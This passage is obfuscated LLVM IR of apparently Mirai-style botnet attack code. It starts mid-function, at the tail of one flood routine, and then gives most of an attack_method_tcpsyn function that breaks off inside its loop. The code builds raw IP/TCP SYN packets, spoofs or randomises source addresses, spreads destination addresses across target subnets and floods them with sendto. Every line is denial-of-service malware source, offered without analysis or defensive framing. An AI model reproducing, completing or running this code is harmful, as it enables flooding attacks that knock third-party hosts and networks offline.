  %626 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 6
  store i16 %625, i16* %627, align 4
  %628 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %629 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %628, i32 0, i32 1
  %630 = load i16, i16* %629, align 2
  %631 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %632 = load i32, i32* %9, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i64 %633
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %634, i32 0, i32 0
  %636 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %635, i32 0, i32 1
  store i16 %630, i16* %636, align 2
  %637 = load i32, i32* %10, align 4
  %638 = load i8*, i8** %32, align 8
  %639 = load i32, i32* %26, align 4
  %640 = sext i32 %639 to i64
  %641 = sub i64 0, 40
  %642 = sub i64 0, %640
  %643 = add i64 %641, %642
  %644 = sub i64 0, %643
  %645 = add i64 40, %640
  %646 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %647 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %648 = load i32, i32* %9, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %647, i64 %649
  %651 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i32 0, i32 0
  %652 = bitcast %struct.sockaddr_in* %651 to %struct.sockaddr*
  store %struct.sockaddr* %652, %struct.sockaddr** %646, align 8
  %653 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %654 = load %struct.sockaddr*, %struct.sockaddr** %653, align 8
  %655 = call i64 @sendto(i32 %637, i8* %638, i64 %644, i32 16384, %struct.sockaddr* %654, i32 16)
  br label %656

; <label>:656:                                    ; preds = %597
  %657 = load i32, i32* %9, align 4
  %658 = sub i32 %657, -285192911
  %659 = add i32 %658, 1
  %660 = add i32 %659, -285192911
  %661 = add nsw i32 %657, 1
  store i32 %660, i32* %9, align 4
  br label %475

; <label>:662:                                    ; preds = %475
  br label %474

; <label>:663:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %679

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %679

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %499, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %506

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 51, -1
  %137 = or i8 %134, %135
  %138 = or i8 51, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 -50, -1
  %145 = and i8 %142, -50
  %146 = and i8 %140, %144
  %147 = and i8 %143, -50
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 -50, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 %160, -1
  %162 = xor i8 -16, -1
  %163 = xor i8 -52, -1
  %164 = or i8 %161, %162
  %165 = or i8 -52, %163
  %166 = xor i8 %164, -1
  %167 = and i8 %166, %165
  %168 = and i8 %160, -16
  %169 = xor i8 %167, -1
  %170 = xor i8 5, -1
  %171 = xor i8 77, -1
  %172 = and i8 %169, 77
  %173 = and i8 %167, %171
  %174 = and i8 %170, 77
  %175 = and i8 5, %171
  %176 = or i8 %172, %173
  %177 = or i8 %174, %175
  %178 = xor i8 %176, %177
  %179 = or i8 %169, %170
  %180 = xor i8 %179, -1
  %181 = or i8 77, %171
  %182 = and i8 %180, %181
  %183 = or i8 %178, %182
  %184 = or i8 %167, 5
  store i8 %183, i8* %159, align 4
  %185 = load i8, i8* %12, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 1
  store i8 %185, i8* %187, align 1
  %188 = call zeroext i16 @htons(i16 zeroext 60) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %13, align 2
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  br i1 %199, label %200, label %204

; <label>:200:                                    ; preds = %113
  %201 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 4
  store i16 %201, i16* %203, align 2
  br label %204

; <label>:204:                                    ; preds = %200, %113
  %205 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 6
  store i8 6, i8* %206, align 1
  %207 = load i32, i32* %26, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 8
  store i32 %207, i32* %209, align 4
  %210 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %211 = load i32, i32* %9, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  store i32 %215, i32* %217, align 4
  %218 = load i16, i16* %16, align 2
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 0
  store i16 %219, i16* %221, align 4
  %222 = load i16, i16* %17, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 1
  store i16 %223, i16* %225, align 2
  %226 = load i32, i32* %18, align 4
  %227 = trunc i32 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = zext i16 %228 to i32
  %230 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 2
  store i32 %229, i32* %231, align 4
  %232 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 4
  %234 = load i16, i16* %233, align 4
  %235 = xor i16 %234, -1
  %236 = xor i16 -241, -1
  %237 = xor i16 3652, -1
  %238 = or i16 %235, %236
  %239 = or i16 3652, %237
  %240 = xor i16 %238, -1
  %241 = and i16 %240, %239
  %242 = and i16 %234, -241
  %243 = xor i16 %241, -1
  %244 = xor i16 160, -1
  %245 = xor i16 20542, -1
  %246 = and i16 %243, 20542
  %247 = and i16 %241, %245
  %248 = and i16 %244, 20542
  %249 = and i16 160, %245
  %250 = or i16 %246, %247
  %251 = or i16 %248, %249
  %252 = xor i16 %250, %251
  %253 = or i16 %243, %244
  %254 = xor i16 %253, -1
  %255 = or i16 20542, %245
  %256 = and i16 %254, %255
  %257 = or i16 %252, %256
  %258 = or i16 %241, 160
  store i16 %257, i16* %233, align 4
  %259 = load i8, i8* %20, align 1
  %260 = sext i8 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = xor i16 %260, -1
  %265 = xor i16 1, -1
  %266 = xor i16 1294, -1
  %267 = or i16 %264, %265
  %268 = or i16 1294, %266
  %269 = xor i16 %267, -1
  %270 = and i16 %269, %268
  %271 = and i16 %260, 1
  %272 = shl i16 %270, 13
  %273 = xor i16 -8193, -1
  %274 = xor i16 %263, %273
  %275 = and i16 %274, %263
  %276 = and i16 %263, -8193
  %277 = xor i16 %275, -1
  %278 = xor i16 %272, -1
  %279 = xor i16 26897, -1
  %280 = and i16 %277, 26897
  %281 = and i16 %275, %279
  %282 = and i16 %278, 26897
  %283 = and i16 %272, %279
  %284 = or i16 %280, %281
  %285 = or i16 %282, %283
  %286 = xor i16 %284, %285
  %287 = or i16 %277, %278
  %288 = xor i16 %287, -1
  %289 = or i16 26897, %279
  %290 = and i16 %288, %289
  %291 = or i16 %286, %290
  %292 = or i16 %275, %272
  store i16 %291, i16* %262, align 4
  %293 = load i8, i8* %21, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = xor i16 1, -1
  %299 = xor i16 %294, %298
  %300 = and i16 %299, %294
  %301 = and i16 %294, 1
  %302 = shl i16 %300, 12
  %303 = xor i16 %297, -1
  %304 = xor i16 -4097, -1
  %305 = xor i16 18229, -1
  %306 = or i16 %303, %304
  %307 = or i16 18229, %305
  %308 = xor i16 %306, -1
  %309 = and i16 %308, %307
  %310 = and i16 %297, -4097
  %311 = xor i16 %309, -1
  %312 = xor i16 %302, -1
  %313 = xor i16 15171, -1
  %314 = and i16 %311, 15171
  %315 = and i16 %309, %313
  %316 = and i16 %312, 15171
  %317 = and i16 %302, %313
  %318 = or i16 %314, %315
  %319 = or i16 %316, %317
  %320 = xor i16 %318, %319
  %321 = or i16 %311, %312
  %322 = xor i16 %321, -1
  %323 = or i16 15171, %313
  %324 = and i16 %322, %323
  %325 = or i16 %320, %324
  %326 = or i16 %309, %302
  store i16 %325, i16* %296, align 4
  %327 = load i8, i8* %22, align 1
  %328 = sext i8 %327 to i16
  %329 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 4
  %331 = load i16, i16* %330, align 4
  %332 = xor i16 %328, -1
  %333 = xor i16 1, -1
  %334 = xor i16 -30352, -1
  %335 = or i16 %332, %333
  %336 = or i16 -30352, %334
  %337 = xor i16 %335, -1
  %338 = and i16 %337, %336
  %339 = and i16 %328, 1
  %340 = shl i16 %338, 11
  %341 = xor i16 %331, -1
  %342 = xor i16 -2049, -1
  %343 = xor i16 -20814, -1
  %344 = or i16 %341, %342
  %345 = or i16 -20814, %343
  %346 = xor i16 %344, -1
  %347 = and i16 %346, %345
  %348 = and i16 %331, -2049
  %349 = xor i16 %347, -1
  %350 = xor i16 %340, -1
  %351 = xor i16 11233, -1
  %352 = and i16 %349, 11233
  %353 = and i16 %347, %351
  %354 = and i16 %350, 11233
  %355 = and i16 %340, %351
  %356 = or i16 %352, %353
  %357 = or i16 %354, %355
  %358 = xor i16 %356, %357
  %359 = or i16 %349, %350
  %360 = xor i16 %359, -1
  %361 = or i16 11233, %351
  %362 = and i16 %360, %361
  %363 = or i16 %358, %362
  %364 = or i16 %347, %340
  store i16 %363, i16* %330, align 4
  %365 = load i8, i8* %23, align 1
  %366 = sext i8 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = xor i16 1, -1
  %371 = xor i16 %366, %370
  %372 = and i16 %371, %366
  %373 = and i16 %366, 1
  %374 = shl i16 %372, 10
  %375 = xor i16 -1025, -1
  %376 = xor i16 %369, %375
  %377 = and i16 %376, %369
  %378 = and i16 %369, -1025
  %379 = and i16 %377, %374
  %380 = xor i16 %377, %374
  %381 = or i16 %379, %380
  %382 = or i16 %377, %374
  store i16 %381, i16* %368, align 4
  %383 = load i8, i8* %24, align 1
  %384 = sext i8 %383 to i16
  %385 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 4
  %387 = load i16, i16* %386, align 4
  %388 = xor i16 %384, -1
  %389 = xor i16 1, -1
  %390 = xor i16 -592, -1
  %391 = or i16 %388, %389
  %392 = or i16 -592, %390
  %393 = xor i16 %391, -1
  %394 = and i16 %393, %392
  %395 = and i16 %384, 1
  %396 = shl i16 %394, 9
  %397 = xor i16 -513, -1
  %398 = xor i16 %387, %397
  %399 = and i16 %398, %387
  %400 = and i16 %387, -513
  %401 = xor i16 %399, -1
  %402 = xor i16 %396, -1
  %403 = xor i16 -30460, -1
  %404 = and i16 %401, -30460
  %405 = and i16 %399, %403
  %406 = and i16 %402, -30460
  %407 = and i16 %396, %403
  %408 = or i16 %404, %405
  %409 = or i16 %406, %407
  %410 = xor i16 %408, %409
  %411 = or i16 %401, %402
  %412 = xor i16 %411, -1
  %413 = or i16 -30460, %403
  %414 = and i16 %412, %413
  %415 = or i16 %410, %414
  %416 = or i16 %399, %396
  store i16 %415, i16* %386, align 4
  %417 = load i8, i8* %25, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = xor i16 1, -1
  %423 = xor i16 %418, %422
  %424 = and i16 %423, %418
  %425 = and i16 %418, 1
  %426 = shl i16 %424, 8
  %427 = xor i16 %421, -1
  %428 = xor i16 -257, -1
  %429 = xor i16 -26505, -1
  %430 = or i16 %427, %428
  %431 = or i16 -26505, %429
  %432 = xor i16 %430, -1
  %433 = and i16 %432, %431
  %434 = and i16 %421, -257
  %435 = xor i16 %433, -1
  %436 = xor i16 %426, -1
  %437 = xor i16 -14784, -1
  %438 = and i16 %435, -14784
  %439 = and i16 %433, %437
  %440 = and i16 %436, -14784
  %441 = and i16 %426, %437
  %442 = or i16 %438, %439
  %443 = or i16 %440, %441
  %444 = xor i16 %442, %443
  %445 = or i16 %435, %436
  %446 = xor i16 %445, -1
  %447 = or i16 -14784, %437
  %448 = and i16 %446, %447
  %449 = or i16 %444, %448
  %450 = or i16 %433, %426
  store i16 %449, i16* %420, align 4
  %451 = load i8*, i8** %29, align 8
  %452 = getelementptr inbounds i8, i8* %451, i32 1
  store i8* %452, i8** %29, align 8
  store i8 2, i8* %451, align 1
  %453 = load i8*, i8** %29, align 8
  %454 = getelementptr inbounds i8, i8* %453, i32 1
  store i8* %454, i8** %29, align 8
  store i8 4, i8* %453, align 1
  %455 = call i32 @rand_next()
  %456 = xor i32 %455, -1
  %457 = xor i32 15, -1
  %458 = xor i32 -1325440383, -1
  %459 = or i32 %456, %457
  %460 = or i32 -1325440383, %458
  %461 = xor i32 %459, -1
  %462 = and i32 %461, %460
  %463 = and i32 %455, 15
  %464 = add i32 1458, -1150560701
  %465 = add i32 %464, %462
  %466 = sub i32 %465, -1150560701
  %467 = add i32 1458, %462
  %468 = trunc i32 %466 to i16
  %469 = call zeroext i16 @htons(i16 zeroext %468) #7
  %470 = load i8*, i8** %29, align 8
  %471 = bitcast i8* %470 to i16*
  store i16 %469, i16* %471, align 2
  %472 = load i8*, i8** %29, align 8
  %473 = getelementptr inbounds i8, i8* %472, i64 2
  store i8* %473, i8** %29, align 8
  %474 = load i8*, i8** %29, align 8
  %475 = getelementptr inbounds i8, i8* %474, i32 1
  store i8* %475, i8** %29, align 8
  store i8 4, i8* %474, align 1
  %476 = load i8*, i8** %29, align 8
  %477 = getelementptr inbounds i8, i8* %476, i32 1
  store i8* %477, i8** %29, align 8
  store i8 2, i8* %476, align 1
  %478 = load i8*, i8** %29, align 8
  %479 = getelementptr inbounds i8, i8* %478, i32 1
  store i8* %479, i8** %29, align 8
  store i8 8, i8* %478, align 1
  %480 = load i8*, i8** %29, align 8
  %481 = getelementptr inbounds i8, i8* %480, i32 1
  store i8* %481, i8** %29, align 8
  store i8 10, i8* %480, align 1
  %482 = call i32 @rand_next()
  %483 = load i8*, i8** %29, align 8
  %484 = bitcast i8* %483 to i32*
  store i32 %482, i32* %484, align 4
  %485 = load i8*, i8** %29, align 8
  %486 = getelementptr inbounds i8, i8* %485, i64 4
  store i8* %486, i8** %29, align 8
  %487 = load i8*, i8** %29, align 8
  %488 = bitcast i8* %487 to i32*
  store i32 0, i32* %488, align 4
  %489 = load i8*, i8** %29, align 8
  %490 = getelementptr inbounds i8, i8* %489, i64 4
  store i8* %490, i8** %29, align 8
  %491 = load i8*, i8** %29, align 8
  %492 = getelementptr inbounds i8, i8* %491, i32 1
  store i8* %492, i8** %29, align 8
  store i8 1, i8* %491, align 1
  %493 = load i8*, i8** %29, align 8
  %494 = getelementptr inbounds i8, i8* %493, i32 1
  store i8* %494, i8** %29, align 8
  store i8 3, i8* %493, align 1
  %495 = load i8*, i8** %29, align 8
  %496 = getelementptr inbounds i8, i8* %495, i32 1
  store i8* %496, i8** %29, align 8
  store i8 3, i8* %495, align 1
  %497 = load i8*, i8** %29, align 8
  %498 = getelementptr inbounds i8, i8* %497, i32 1
  store i8* %498, i8** %29, align 8
  store i8 8, i8* %497, align 1
  br label %499

; <label>:499:                                    ; preds = %204
  %500 = load i32, i32* %9, align 4
  %501 = sub i32 0, %500
  %502 = sub i32 0, 1
  %503 = add i32 %501, %502
  %504 = sub i32 0, %503
  %505 = add nsw i32 %500, 1
  store i32 %504, i32* %9, align 4
  br label %108

; <label>:506:                                    ; preds = %108
  br label %507

; <label>:507:                                    ; preds = %678, %506
  store i32 0, i32* %9, align 4
  br label %508

; <label>:508:                                    ; preds = %671, %507
  %509 = load i32, i32* %9, align 4
  %510 = load i8, i8* %5, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp slt i32 %509, %511
  br i1 %512, label %513, label %678

; <label>:513:                                    ; preds = %508
  %514 = load i8**, i8*** %11, align 8
  %515 = load i32, i32* %9, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds i8*, i8** %514, i64 %516
  %518 = load i8*, i8** %517, align 8
  store i8* %518, i8** %30, align 8
  %519 = load i8*, i8** %30, align 8
  %520 = bitcast i8* %519 to %struct.iphdr*
  store %struct.iphdr* %520, %struct.iphdr** %31, align 8
  %521 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i64 1
  %523 = bitcast %struct.iphdr* %522 to %struct.tcphdr*
  store %struct.tcphdr* %523, %struct.tcphdr** %32, align 8
  %524 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %525 = load i32, i32* %9, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i64 %526
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i32 0, i32 2
  %529 = load i8, i8* %528, align 4
  %530 = zext i8 %529 to i32
  %531 = icmp slt i32 %530, 32
  br i1 %531, label %532, label %557

; <label>:532:                                    ; preds = %513
  %533 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %534 = load i32, i32* %9, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i64 %535
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i32 0, i32 1
  %538 = load i32, i32* %537, align 4
  %539 = call i32 @ntohl(i32 %538) #7
  %540 = call i32 @rand_next()
  %541 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %542 = load i32, i32* %9, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %541, i64 %543
  %545 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %544, i32 0, i32 2
  %546 = load i8, i8* %545, align 4
  %547 = zext i8 %546 to i32
  %548 = lshr i32 %540, %547
  %549 = sub i32 0, %539
  %550 = sub i32 0, %548
  %551 = add i32 %549, %550
  %552 = sub i32 0, %551
  %553 = add i32 %539, %548
  %554 = call i32 @htonl(i32 %552) #7
  %555 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %556 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %555, i32 0, i32 9
  store i32 %554, i32* %556, align 4
  br label %557

; <label>:557:                                    ; preds = %532, %513
  %558 = load i32, i32* %26, align 4
  %559 = icmp eq i32 %558, -1
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %557
  %561 = call i32 @rand_next()
  %562 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %563 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %562, i32 0, i32 8
  store i32 %561, i32* %563, align 4
  br label %564

; <label>:564:                                    ; preds = %560, %557
  %565 = load i16, i16* %13, align 2
  %566 = zext i16 %565 to i32
  %567 = icmp eq i32 %566, 65535
